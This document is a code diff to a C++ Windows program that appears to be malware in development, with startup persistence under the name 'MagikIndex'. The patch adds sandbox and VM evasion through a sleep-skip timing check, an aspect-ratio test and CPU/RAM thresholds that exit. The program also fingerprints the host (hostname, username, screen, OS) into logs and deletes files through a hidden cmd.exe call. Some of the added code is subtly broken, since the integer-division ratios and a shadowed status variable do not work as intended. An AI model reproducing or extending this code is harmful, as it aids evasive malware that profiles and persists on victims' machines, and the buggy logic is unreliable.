@@ -25,7 +25,7 @@ typedef unsigned long long uint64_t;
 #define MyServer ""
 
 #define CharactersPerLog 5000
-#define MaximumFolderSize 1000
+#define MaximumFolderSize 10 
 #define MinimumRam 2048
 
 #define MAX_LENGTH 1024
@@ -43,7 +43,7 @@ typedef unsigned long long uint64_t;
 #pragma comment(lib, "Slwga.lib")
 //#pragma comment(lib, "Wbemuuid.lib.")
 
-//#define debug
+#define debug
 
 
 FILE* OUTPUT_FILE;
@@ -52,31 +52,30 @@ FILE* OUTPUT_FILE;
 extern "C" int RandomGenerator();
 
 
-bool IsBrowsePath(const String& path)
-{
-    return (path == "." || path == "..");
-}
+int CalculateDirSize(std::string DirectoryToCheck) {
 
-
-uint64_t CalculateDirSize(const String& path, uint64_t size = 0) //https://stackoverflow.com/questions/10015341/size-of-a-directory but converted to ANSI and Removed err check and Dir check(assume we dont have subdirs)
-{
+    HANDLE hFind;
     WIN32_FIND_DATAA data;
-    HANDLE sh = NULL;
-    sh = FindFirstFileA((path + "\\*").c_str(), &data);
 
-    do
-    {
-        // skip current and parent
-        if (!IsBrowsePath(data.cFileName))
-        {
-            size += (uint64_t)(data.nFileSizeHigh * (MAXDWORD)+data.nFileSizeLow);
-        }
+    DirectoryToCheck += "\\*.*";
 
-    } while (FindNextFileA(sh, &data)); // do
+    int FileCounter = 0;
 
-    FindClose(sh);
+    char FilePath[MAX_PATH + 1];
+    DWORD FileSize = MAX_PATH + 1;
 
-    return size;
+    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
+            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
+            FileCounter++;
+            //}
+        } while (FindNextFileA(hFind, &data));
+        FindClose(hFind);
+    }
+
+    return FileCounter;
 }
 
 
@@ -252,6 +251,8 @@ int main()
 
     srand((int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator());
 
+    bool PatchedMe = false;
+
 #ifndef debug
 
     int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
@@ -261,9 +262,9 @@ int main()
     }
 
     DWORD PatchCheck = GetTickCount();
-
+    
     if ((int)(PatchCheck - Tick1) < Time - 5000) {
-        exit(1);
+        PatchedMe = true;
     }
 
 
@@ -282,6 +283,7 @@ Log:
     std::string InternetText = "Internet Status:";
     std::string WidthText = "Screen Width:";
     std::string HeightText = "Screen Height:";
+    std::string AspectRatioText = "Aspect Ratio:";
     std::string WindowsText = "Windows Version:";
     std::string OEMText = "OEM Number:";
     std::string CPUNumberText = "Number Of Cores:";
@@ -315,14 +317,34 @@ Log:
     CurrentLog += LogTime;
     CurrentLog += ".txt";
 
+
+
+#ifdef debug
+
+    LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#", CurrentLog);
+
+#else
+
+    LogItChar("Started in normal mode...", CurrentLog);
+
+#endif
+
+    if (PatchedMe) {
+        LogItChar("",CurrentLog);
+    }
+
+
     DWORD Size = MAX_LENGTH+1;
 
     char HostName[MAX_LENGTH+1];
 
     char UserName[MAX_LENGTH+1];
 
-    BOOL InternetStatus = InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
-    std::string InternetStatusString = std::to_string(InternetStatus);
+    std::string InternetStatusString = "Not connected";
+
+    if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+        std::string InternetStatusString = "Connected";
+    }
 
     GetComputerNameA(HostName,&Size);
 
@@ -352,11 +374,12 @@ Log:
     RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
 
 
-    if (CalculateDirSize(MagikFolder) < MaximumFolderSize) {
+    if (CalculateDirSize(MagikFolder) > MaximumFolderSize) {
         std::string Command = "/C del /f /q ";
         Command += MagikFolder;
-        Command += "\\*";
+        Command += "\\*.*";
         ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+        LogItChar("Cleaned MagikIndex folder...",CurrentLog);
     }
 
 
@@ -370,6 +393,22 @@ Log:
     mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
     w = x2 - x1;
     h = y2 - y1;
+
+   
+    double Ratios[6] = {4/3,16/9,21/9,32/9,16/10,5/4}; //check for monitor ratio (got this idea once i noticed heigth on my host and guest dont match, so if started in a not fullscreen VM the aspect ratio will be off)
+    double Ratioed = (double)w / h;
+    bool RatioMatch = false;
+    for (int q = 0; q < 6; q++) {
+        if (Ratioed == Ratios[q]) {
+            RatioMatch = true;
+        }
+    }
+#ifndef debug
+    if (!RatioMatch) {
+        LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....",CurrentLog);
+        exit(1);
+    }
+#endif
     std::string Width = std::to_string(w);
 
     std::string Height = std::to_string(h);
@@ -437,6 +476,7 @@ Log:
 
 #ifndef debug
     if (siSysInfo.dwNumberOfProcessors < 2 || (RAMStatus.ullTotalPhys / 1024) / 1024 < MinimumRam) {
+        LogItChar("PC Specs dont match the requirements: probably a VM... exiting....", CurrentLog);
         exit(1);
     }
 #endif
@@ -460,7 +500,6 @@ Log:
     }
 
 
-
     TimeText += LogTime;
     LogItChar(TimeText, CurrentLog);
 
@@ -478,6 +517,9 @@ Log:
 
     HeightText += Height;
     LogItChar(HeightText, CurrentLog);
+
+    AspectRatioText += std::to_string(Ratioed);
+    LogItChar(AspectRatioText,CurrentLog);
 
     WindowsText += WindowsVersion;
     LogItChar(WindowsText, CurrentLog);
